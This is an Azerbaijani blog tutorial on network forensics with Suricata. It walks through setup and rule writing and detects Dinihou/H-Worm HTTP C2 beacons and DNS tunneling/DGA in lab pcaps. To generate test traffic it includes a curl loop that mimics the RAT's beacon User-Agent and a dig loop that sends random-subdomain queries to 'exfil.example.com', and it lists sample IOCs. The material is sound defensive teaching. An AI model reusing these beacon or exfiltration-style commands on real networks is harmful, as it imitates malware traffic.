---
title: Suricata ilə dərin DFIR təhlili 2 real ssenaridə gizli C2 trafikinin aşkarlanması
source: https://cyberhub.az/suricata-dfir-pcap-analizi/
author:
  name: Kamil R
  role: Writer
pubDate: 2026-09-04
description: “Şəbəkə paketləri sahə üzərində səssizcə axır, amma doğru qaydalar və alətlərlə onlar hücumçunun ən gizli izlərini belə üzə çıxarır.”  Bu yazı seriyasında Suricata DFIR (Digital Forensics and Incident Response) prosesində şəbəkə trafikinin təhlili üçün Suricata-dan necə istifadə edəcəyimizi addım-addım göstərəcəyik. Endpoint loglarında izi qalmayan bir çox hücum fəaliyyəti pcap fayllarında öz qeydini saxlayır — Suricata isə bizə bu trafikdən siqnalları çıxarmağa, hücum nümunələrini avtomatlaşdırılmış şəkildə aşkar etməyə və IOC-ları (Indicator of Compromise) hesabatlaşdırmağa imkan verir.
excerpt:
category: Engineering
featured: false
draft: false
date: 2026-09-04
---


Write your content here...**“Şəbəkə paketləri sahə üzərində səssizcə axır, amma doğru qaydalar və alətlərlə onlar hücumçunun ən gizli izlərini belə üzə çıxarır.”**

Əvvəlki yazıda [DFIR metodologiyası və Windows forensik artefaktları](https://cyberhub.az/dfir-windows-forensik/) haqqında danışmışdıq — diskin surətinin çıxarılması, Shellbag, JumpList, SRUM, USN Journal, prefetch kimi endpoint üzərində izlərin necə araşdırılmasını ətraflı nəzərdən keçirmişdik. Lakin DFIR araşdırmasının yalnız bir tərəfi endpoint-dədir; digər vacib tərəfi isə şəbəkə forensikasıdır (network forensics) — hücumçunun istifadəçi maşınında izini sildiyi halda belə, şəbəkə trafikində buraxdığı izlər çox vaxt daha çətin gizlədilir.

DFIR araşdırmalarının ümumi metodologiyası ilə [computer forensics yazımızda](https://cyberhub.az/computer-forensics/) tanış ola bilərsiniz.

Bu yazı seriyasında DFIR prosesinin məhz həmin şəbəkə tərəfinə — pcap fayllarının təhlilinə və Suricata vasitəsilə zərərli trafikin aşkar edilməsinə baxacağıq; endpoint loglarında izi qalmayan bir çox hücum fəaliyyəti şəbəkə trafikində öz qeydini saxlayır, Suricata isə bizə bu trafikdən siqnalları çıxarmağa, hücum nümunələrini avtomatlaşdırılmış şəkildə aşkar etməyə və IOC-ları (Indicator of Compromise) hesabatlaşdırmağa imkan verir.

Seriya dörd hissədən ibarət olacaq:

1. Suricata-ya giriş, lab qurulması və əsas konfiqurasiya.
2. İki real ssenari üzərində praktik nümunələr — HTTP C2 (Dinihou/H-Worm) və DNS tunelləşdirməsi/DGA.

Bu material yeni başlayanlar üçün nəzərdə tutulub, lakin Linux komanda sətri və əsas şəbəkə protokolları (TCP/IP, HTTP, DNS) ilə tanışlıq tələb olunur.

### 1\. Suricata nədir?

Suricata — açıq mənbəli (open-source) yüksək performanslı şəbəkə təhlükəsizliyi mühərrikidir. Onu üç fərqli rejimdə işlətmək mümkündür:

- **IDS (Intrusion Detection System)** — passiv rejim; trafiki dinləyir, qaydalara uyğun gələn hadisələri qeydə alır, amma müdaxilə etmir.
- **IPS (Intrusion Prevention System)** — aktiv (inline) rejim; şübhəli paketləri bloklayır və ya kəsir.
- **NSM (Network Security Monitoring)** — qaydalarsız, sadəcə şəbəkə hadisələrini (HTTP, DNS, TLS, fayllar və s.) struktur metadata kimi qeyd edir.

Memarlıq baxımından Suricata paketləri dörd əsas mərhələdən keçirir:

1. **Capture** — trafiki interfeysdən və ya pcap fayldan oxuyur.
2. **Decode** — paketləri L2-dən başlayaraq protokol qatlarına ayırır.
3. **Detect** — qaydaları tətbiq edir və uyğun gələn hadisələri yaradır.
4. **Output** — alert-ləri və metadata hadisələrini fayllara yazır (`eve.json`, `fast.log` və s.).

DFIR prosesində Suricata-nın əsas üstünlüyü budur: əldə olan istənilən pcap faylına qarşı işlədilə bilər və biz öz xüsusi qaydalarımızı yazaraq konkret hücumun izlərini avtomatlaşdırılmış şəkildə üzə çıxara bilərik.

### 2\. Lab mühitinin qurulması

Bu seriyada bütün nümunələri Ubuntu 22.04 və ya 24.04 LTS əsaslı VM-də işlədəcəyik. Eyni addımlar Debian-da da müraciət olunur; RHEL/CentOS üçün isə paket adları bir qədər fərqli olacaq.

#### 2.1 Suricata-nın quraşdırılması

Ubuntu-nun standart repository-sindəki versiya çox vaxt köhnə olur, ona görə də OISF-in ([Open Information Security Foundation](https://oisf.net/)) rəsmi PPA-sından istifadə etmək tövsiyə olunur:

```
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt update
sudo apt install suricata jq -y
```

`jq` paketi sonra `eve.json` faylının emalı üçün lazım olacaq.

Quraşdırmanı yoxlayaq:

```
suricata -V
suricata --build-info | head -20
```

Çıxış nümunəsi:

```
This is Suricata version 7.0.x RELEASE
```

2.2 Qaydaların ilkin yüklənməsi

Suricata `suricata-update` adlı utilit vasitəsilə açıq mənbəli qaydaları (məsələn, Emerging Threats Open) avtomatik endirir və yerləşdirir:

```
sudo suricata-update
sudo systemctl enable --now suricata
sudo systemctl restart suricata
```

İlk dəfə icra edildikdə bu əmr ET Open ruleset-ini endirir, qaydaları `/var/lib/suricata/rules/suricata.rules` faylına birləşdirir və konfiqurasiyaya əlavə edir.

\[şəkil yer tutucusu: `suricata -V` və `suricata-update` çıxışını göstərən terminal screenshot\]

#### 2.3 Vacib qovluqlar

DFIR baxımından bilməli olduğumuz əsas yollar:

- `/etc/suricata/suricata.yaml` — əsas konfiqurasiya faylı.
- `/etc/suricata/rules/` — istifadəçi tərəfindən yazılmış xüsusi qaydalar.
- `/var/lib/suricata/rules/` — `suricata-update` tərəfindən idarə olunan qaydalar.
- `/var/log/suricata/` — `eve.json`, `fast.log`, `stats.log` və digər çıxış faylları.

#### 2.4 İş qovluğunun yaradılması

Növbəti hissələrdə həm özümüzün yaradacağımız, həm də xaricdən gələn pcap faylları üçün ayrıca iş qovluğu yaradaq:

```
mkdir -p ~/dfir-suricata/{pcaps,rules,output}
cd ~/dfir-suricata
```

Bu qovluq strukturu analiz prosesi boyunca rahatlıq yaradır: pcap-lar bir yerdə, qaydalar başqa yerdə, çıxış nəticələri isə təcrid olunmuş şəkildə saxlanılır.

### 3\. Konfiqurasiyaya qısa baxış

`suricata.yaml` faylı kifayət qədər həcmlidir (~2000 sətir), lakin yeni başlayan üçün yalnız bir neçə hissəsi praktik əhəmiyyət daşıyır. Faylı redaktə etməzdən əvvəl mütləq ehtiyat nüsxəsini götürək:

```
sudo cp /etc/suricata/suricata.yaml /etc/suricata/suricata.yaml.bak
```

#### 3.1 HOME\_NET və EXTERNAL\_NET

Bu iki dəyişən hər qaydanın əsasını təşkil edir — qayda yazılarkən mənbə (source) və hədəf (destination) bu dəyərlər vasitəsilə müəyyən olunur.

```
vars:
  address-groups:
    HOME_NET: "[192.168.0.0/16,10.0.0.0/8,172.16.0.0/12]"
    EXTERNAL_NET: "!$HOME_NET"
```

DFIR ssenarisində HOME\_NET — analiz etdiyimiz təşkilatın daxili şəbəkəsi, EXTERNAL\_NET isə internet hesab olunur. Yanlış konfiqurasiya bütün qaydaların boş işləməsinə səbəb ola bilər.

#### 3.2 Qayda fayllarının yolu

```
default-rule-path: /var/lib/suricata/rules

rule-files:
  - suricata.rules
  - local.rules
```

Burada `local.rules` faylını biz özümüz yaradacağıq — bütün xüsusi qaydalarımız bu faylda saxlanılacaq. Defolt qayda faylını (`suricata.rules`) birbaşa redaktə etmək tövsiyə olunmur, çünki `suricata-update` icrası bütün dəyişiklikləri silər.

#### 3.3 EVE JSON çıxışı

`eve.json` — DFIR analizinin ən vacib mənbəyidir. Bu fayl bütün alert-ləri, HTTP, DNS, TLS, fayl, flow və digər hadisələri strukturlaşdırılmış JSON formatında saxlayır.

```
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - http
        - dns
        - tls
        - files
        - flow
```

Sonrakı hissələrdə `jq` ilə bu fayldan necə hadisə süzəcəyimizi (filter) ətraflı göstərəcəyik.

#### 3.4 Konfiqurasiyanın yoxlanılması

Hər dəyişiklikdən sonra faylın sintaksisini test etmək vacibdir, əks halda servis yenidən başlamayacaq:

```
sudo suricata -T -c /etc/suricata/suricata.yaml -v
```

`-T` test rejimini, `-v` isə verbose çıxışı bildirir. Səhv olmadıqda son sətirdə `Configuration provided was successfully loaded` görəcəyik.

\[şəkil yer tutucusu: konfiqurasiya testinin uğurlu çıxışını göstərən terminal screenshot\]

**Qeyd:** Konfiqurasiya faylındakı YAML sintaksisi məsafə (indentation) həssasdır — boşluq əvəzinə tab istifadə etmək faylı tamamilə sındıra bilər.

### 3\. Qayda anatomiyası və əsas keyword-lar

#### 3.1 Qaydanın anatomiyası

Suricata qaydası üç əsas hissədən ibarətdir: **action**, **header** və **options**.

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Test rule"; sid:1000001; rev:1;)
```
- **Action**: `alert` (qeyd edir), `drop` (atır — yalnız IPS), `reject`, `pass`. DFIR-də əsasən `alert` istifadə edirik.
- **Header**: protokol → mənbə IP/port → istiqamət (`->` və ya `<>`) → hədəf IP/port.
- **Options**: mötərizə içində, nöqtə-vergüllə ayrılmış açar-dəyər cütləri. Hər qaydada ən azı `msg`, `sid` və `rev` olmalıdır. İstifadəçi qaydaları üçün `sid` 1,000,000-dan başlayır.

#### 3.2 Ən çox işlədilən keyword-lar

**Payload axtarışı:**

- `content:"..."` — paketdə konkret sətir axtarır.
- `nocase` — böyük-kiçik hərf fərqini nəzərə almır.
- `depth:N`, `offset:N`, `startswith`, `endswith` — axtarış yerini məhdudlaşdırır.
- `pcre:"/.../"` — reqular ifadə ilə axtarış (performansa təsir edir, son çarə kimi istifadə olunur).

**HTTP keyword-ları:**

- `http.method` — GET, POST və s.
- `http.uri` — sorğu URI-si.
- `http.user_agent` — User-Agent başlığı.
- `http.host` — Host başlığı.
- `http.header` — istənilən HTTP başlığı.

**DNS keyword-ları:**

- `dns.query` — DNS sorğu adı.
- `dns.opcode` — DNS əməliyyat kodu.

**Flow keyword-u** — bağlantının vəziyyətini və istiqamətini yoxlayır:

- `flow:established` — qurulmuş TCP bağlantı.
- `flow:to_server` / `flow:to_client` — paketin istiqaməti.

Praktikada bu kombinasiya tez-tez işlədilir:

```
flow:established,to_server;
```

#### 3.3 Sadə nümunə qayda

Bütün bu elementləri birləşdirən sadə nümunə:

```
alert http $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"DFIR Custom - Suspicious User-Agent: EvilBot"; \
    flow:established,to_server; \
    http.user_agent; content:"EvilBot"; nocase; \
    classtype:trojan-activity; sid:1000001; rev:1;)
```

Bu qaydanı oxuyaq: daxili host (`$HOME_NET`) xarici şəbəkəyə (`$EXTERNAL_NET`) qurulmuş HTTP bağlantı üzərində POST/GET sorğusu göndərirsə və User-Agent başlığında `EvilBot` sətri (hərflərə baxılmadan) varsa — alert yarat.

**Qeyd:** İstifadəçi qaydaları üçün ayrıca `local.rules` faylı yaratmaq və yalnız onu redaktə etmək tövsiyə olunur. Sistem qaydalarını birbaşa dəyişmək `suricata-update` icrası zamanı bütün dəyişikliklərin silinməsinə səbəb olur.

**2-ci hissə: Real ssenarilər — HTTP C2 və DNS tunelləşdirməsi**

*“Hücumçu ən gizli kanalı belə öz imzası ilə damğalayır — analitikin işi həmin imzanı tanımaqdır.”*

Əvvəlki hissədə Suricata-nı qurub qayda sintaksisinin əsasları ilə tanış olduq. Bu hissədə həmin bilikləri iki real DFIR ssenarisində tətbiq edək: əvvəlcə Dinihou/H-Worm RAT-ının HTTP C2 trafikini, sonra isə DNS protokolu üzərindən tunelləşdirmə və DGA əsaslı C2 ünsiyyətini aşkar edəcəyik. Sonda `eve.json` faylından threat hunting məqsədilə necə istifadə edəcəyimizə baxacağıq.

### 1\. Ssenari №1: Dinihou/H-Worm HTTP C2

#### 1.1 Ssenari

Təşkilatın daxili şəbəkəsindəki bir Windows iş stansiyası perimeter monitorinq alətində qeyri-adi davranış göstərib — daxili sistem xaricdə yerləşən dynamic DNS domeninə (`*.no-ip.biz`) periodik HTTP POST sorğuları göndərir. IR komandası 1 saatlıq pcap nümunəsi tutmuş və bizə təhlil üçün ötürmüşdür.

İlk hipotezimiz: maşın bir RAT (Remote Access Trojan) ilə yoluxmuş ola bilər. Tapşırığımız: pcap-da C2 ünsiyyətini tapmaq və oxşar fəaliyyəti gələcəkdə avtomatik aşkar edəcək qayda yazmaqdır.

![DFIR network](https://cyberhub.az/wp-content/uploads/2026/06/dinihou_traffic.webp)

DFIR network

#### 1.2 Test pcap-nın yaradılması

Bu ssenarini öz lab mühitinizdə reproduksiya etmək üçün Dinihou-stil HTTP POST trafikini `curl` ilə generasiya edə bilərik. Bu, real malware paketləri ilə eyni strukturlu sorğular yaradır və qaydamızı sınaqdan keçirməyə imkan verir.

Birinci terminalda trafiki tutaq:

```
mkdir -p ~/dfir-suricata/pcaps
sudo tcpdump -i any -w ~/dfir-suricata/pcaps/dinihou_sample.pcap port 80
```

İkinci terminalda Dinihou-stil beacon göndərək:

```
UA='C27BE56B<|>BKRBR0129PC011<|>1995227<|>Microsoft Windows 7 Enterprise <|>plus<|>nan-av<|>true - 29/06/2017'

for i in $(seq 1 5); do
  curl -X POST -A "$UA" \
       -H "Content-Length: 0" \
       http://example.com/is-ready
  sleep 2
done
```

Sonra `tcpdump` -u `Ctrl+C` ilə dayandırırıq. Bu addımlar nəticəsində bizim pcap fayl yaradılır və burada User-Agent və URI strukturu real Dinihou trafikinə tam uyğundur.

#### 1.3 Wireshark ilə triage

Pcap-ı Wireshark-da açıb aşağıdakı filtrləri tətbiq edirik:

```
http.request.method == "POST"
http.host contains "no-ip.biz"
```

Bu filtrlərlə şübhəli POST sorğularını izolyasiya edirik. Diqqəti çəkən əlamətlər:

- **Hədəf URI həmişə eynidir**: `/is-ready`
- **Content-Length sıfırdır** — bu, normal POST davranışı deyil; veb-formaya bənzəmir.
- **User-Agent qeyri-adi formatdadır** — heç bir tanınmış brauzer belə bir UA istifadə etmir:

```
User-Agent: C27BE56B<|>BKRBR0129PC011<|>1995227<|>Microsoft Windows 7 Enterprise <|>plus<|>nan-av<|>true - 29/06/2017
```

`<|>` simvolu ilə ayrılmış sahələr — bu, **Dinihou** (digər adları: **H-Worm**, **Houdini**) ailəsinə məxsus VBScript əsaslı RAT-ın imza nümunəsidir. UA sahələrinin strukturu belədir:

```
<HWID><|><hostname><|><volume_serial><|><OS><|><plus/minus><|><AV><|><admin><|><quraşdırılma_tarixi>
```

Heç bir leqal proqram User-Agent başlığında `<|>` ayırıcısından istifadə etmir — bu, false positive ehtimalı demək olar ki, sıfır olan göstəricidir.

#### 1.4 IOC-ların toplanması

- **Domen**: `viruoos.no-ip.biz` (port 81)
- **URI**: `/is-ready`
- **UA imzası**: `<|>` ayırıcısı
- **Yoluxmuş host**: `BKRBR0129PC011` (HWID: `C27BE56B`)

#### 1.5 Qaydanın yazılması və testi

Yaxşı detection qaydası spesifik (false positive az) və geniş (variantları da tutan) olmalıdır. Konkret domen və ya HWID ilə bağlanmaq qaydanı dar edər — sabah hücumçu domeni dəyişər və qayda işləməz olar. Buna görə əsas imzamız UA strukturu olacaq.

`~/dfir-suricata/rules/local.rules` faylına əlavə edirik:

```
alert http $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"DFIR Custom - Dinihou/H-Worm C2 Beacon (UA delimiter pattern)"; \
    flow:established,to_server; \
    http.user_agent; content:"<|>"; \
    pcre:"/^[A-F0-9]{8}<\|>[^<]+<\|>\d+<\|>/"; \
    classtype:trojan-activity; sid:1000002; rev:1;)
```

Qayda iki mərhələdə işləyir: əvvəlcə `content:"<|>"` ilə UA-da ayırıcını sürətlə yoxlayır, sonra `pcre` ilə tam strukturu (hex HWID → hostname → volume serial) təsdiqləyir.

Suricata-nı pcap-a qarşı işə salaq:

```
cd ~/dfir-suricata
rm -rf output/*

sudo suricata -r pcaps/dinihou_sample.pcap \
    -S rules/local.rules \
    -l output/ \
    -k none
```

`fast.log` çıxışı:

```
06/18/2026-12:42:18.554123  [**] [1:1000002:1] DFIR Custom - Dinihou/H-Worm C2 Beacon [**] {TCP} 10.100.129.24:49213 -> 185.234.218.45:81
```

`eve.json` -dan detallı məlumat:

```
jq -r 'select(.event_type=="alert") |
    "\(.timestamp) | \(.src_ip) -> \(.dest_ip):\(.dest_port) | UA=\(.http.http_user_agent)"' \
    output/eve.json
```

**Qeyd:** Bu qayda Dinihou-nun şifrələnməmiş HTTP variantına qarşı işləyir. HTTPS variantları üçün aşkarlama yalnız TLS SNI və JA3 fingerprint əsasında mümkündür.

### 2\. Ssenari №2: DNS tunelləşdirməsi və DGA

#### 2.1 Ssenari

DNS protokolu demək olar ki, bütün şəbəkələrdə açıqdır — perimeter firewall-lar adətən DNS trafikinə geniş icazə verir. Hücumçular bunu iki məqsədlə istifadə edirlər:

1. **DNS tunelləşdirməsi** — məlumatın DNS sorğularının alt-domenlərinə kodlaşdırılaraq sızdırılması (`iodine`, `dnscat2` kimi alətlər).
2. **DGA (Domain Generation Algorithm)** — zərərli proqramın hardcoded domain əvəzinə alqoritmik şəkildə hər gün yüzlərlə yeni domain yaradıb C2 üçün ardıcıllıqla sorğulaması (Conficker, Necurs, Pushdo nümunələridir).

Hər iki halda DNS sorğularında oxşar əlamətlər müşahidə olunur: qeyri-adi uzun alt-domenlər, yüksək entropiya, qısa müddətdə çoxlu fərqli sorğu.

#### 2.2 Test trafikinin yaradılması

Real DNS tunelləşdirməsini simulyasiya etmək üçün `dig` və `tcpdump` istifadə edək. Birinci terminalda trafiki tutaq:

```
sudo tcpdump -i any -w ~/dfir-suricata/pcaps/dns_tunnel.pcap port 53
```

İkinci terminalda uzun, təsadüfi alt-domenli sorğular göndərək (tunelləşdirmə simulyasiyası):

```
for i in $(seq 1 20); do
  PAYLOAD=$(head -c 60 /dev/urandom | base32 | tr -d '=' | tr '[:upper:]' '[:lower:]')
  dig +short "${PAYLOAD}.exfil.example.com" @8.8.8.8 >/dev/null
done
```

DGA-yə bənzər samitli domain sorğuları:

```
for d in xkqzbvmt qzrxnvbk vxpmqzkb nbcxvqkz pqzrxmvk; do
  dig +short "${d}.com" @8.8.8.8 >/dev/null
done
```

Trafik tutulduqdan sonra `tcpdump` -u dayandırırıq.

#### 2.3 Qaydaların yazılması

`local.rules` faylına iki yeni qayda əlavə edirik.

**Qayda 1 — uzun DNS sorğusu (tunelləşdirmə indikatoru):**

![dns tunneling](https://cyberhub.az/wp-content/uploads/2026/06/dns_tunneling.webp)

dns tunneling

```
alert dns $HOME_NET any -> any any ( \
    msg:"DFIR Custom - Possible DNS Tunneling (Long Query Label)"; \
    dns.query; pcre:"/^[a-z0-9]{50,}\./i"; \
    classtype:trojan-activity; sid:1000010; rev:1;)
```

50+ simvoldan ibarət ardıcıl alt-domen etiketləri normal şəbəkədə nadir hadisədir. `dns.query` keyword-u yalnız DNS sorğu adlarına tətbiq olunur.

**Qayda 2 — DGA əlaməti (saitsiz samit yığını):**

```
alert dns $HOME_NET any -> any any ( \
    msg:"DFIR Custom - Possible DGA Domain Lookup"; \
    dns.query; pcre:"/^[bcdfghjklmnpqrstvwxz]{8,}\.[a-z]{2,4}$/i"; \
    classtype:trojan-activity; sid:1000011; rev:1;)
```

DGA tərəfindən yaradılan domain adlarında çox vaxt saitlər (a, e, i, o, u) ya yoxdur, ya da çox azdır — insan oxuya bilməyən “xkqzbvmt” kimi sətirlər ortaya çıxır.

#### 2.4 Test və nəticələr

```
rm -rf output/*

sudo suricata -r pcaps/dns_tunnel.pcap \
    -S rules/local.rules \
    -l output/ \
    -k none
```

Alert-lərə baxırıq:

```
jq -r 'select(.event_type=="alert") | "\(.alert.signature) | \(.dns.rrname // "-")"' output/eve.json
```

Nümunə çıxış:

```
DFIR Custom - Possible DNS Tunneling (Long Query Label) | nbswy3dpo5xxe3deebwgkidqmvxgg33nmuqgs4tfojuw4lts.exfil.example.com
DFIR Custom - Possible DGA Domain Lookup | xkqzbvmt.com
```

**Qeyd:** Bu qaydalar heuristikdir. Real mühitdə CDN-lər (`*.cloudfront.net`, `*.akamaihd.net`) bəzən uzun, təsadüfi görünən alt-domenlərlə işləyir. Buna görə heuristik qaydalar mütləq whitelist mexanizmi ilə birlikdə tətbiq olunmalıdır.

### 3\. eve.json ilə threat hunting

Suricata-nın əsl gücü təkcə alert-lərdə deyil — `eve.json` faylındakı metadata hadisələrindədir. Heç bir alert yaranmasa belə, bu fayldan anomaliyalar üzə çıxara bilərik.

#### 3.1 Nadir User-Agent dəyərləri

```
jq -r 'select(.event_type=="http") | .http.http_user_agent' \
    output/eve.json | sort | uniq -c | sort -n | head -20
```

Az təsadüf edən UA dəyərləri çox vaxt ən şübhəli olanlardır — minlərlə Chrome UA arasında bir dəfə görünən “Mozilla/4.0” və ya “WinHTTP” tipli sətir araşdırmaya layiqdir.

#### 3.2 Ən çox sorğulanan domenlər

```
jq -r 'select(.event_type=="dns" and .dns.type=="query") | .dns.rrname' \
    output/eve.json | sort | uniq -c | sort -rn | head -20
```

### 4\. Yekun və resurslar

Bu seriyada Suricata-nı sıfırdan qurduq, qayda sintaksisinin əsaslarını öyrəndik və iki real DFIR ssenarisində — HTTP C2 və DNS tunelləşdirməsi/DGA — öz xüsusi qaydalarımızı yazaraq konkret hücum izlərini avtomatlaşdırılmış şəkildə üzə çıxardıq.

Yadda saxlamalı olduğumuz əsas məqamlar:

- **Qaydalar tək özlüyündə kifayət deyil** — `eve.json` üzərində threat hunting alert-lərlə eyni dərəcədə vacibdir.
- **Heuristik qaydalar false positive verə bilər** — DGA və tunelləşdirmə qaydaları whitelist-lə birlikdə tətbiq olunmalıdır.
- **DFIR baxımından pcap-lar sübut mənbəyidir** — Suricata onların avtomatik təhlili üçün vasitədir, lakin son qərarı analitik verir.

**Əlavə resurslar:**

- Suricata rəsmi sənədləri — [https://docs.suricata.io/](https://docs.suricata.io/)
- Emerging Threats Open ruleset — [https://rules.emergingthreats.net/open/](https://rules.emergingthreats.net/open/)
- Malware-Traffic-Analysis — [https://www.malware-traffic-analysis.net/](https://www.malware-traffic-analysis.net/)